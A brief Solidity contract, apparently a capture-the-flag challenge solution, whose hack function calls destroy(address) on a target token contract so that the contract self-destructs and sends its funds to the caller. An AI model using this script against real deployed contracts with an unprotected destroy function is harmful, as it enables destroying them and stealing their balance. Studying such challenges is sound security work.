// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackRecovery {
    constructor() public{}

    function hack(address _tokenContractAddr) external {
        (bool success, ) = _tokenContractAddr.call(
            abi.encodeWithSignature(
                "destroy(address)",
                msg.sender
            )
        );
        require(success, "HACK FAILED");
    }
}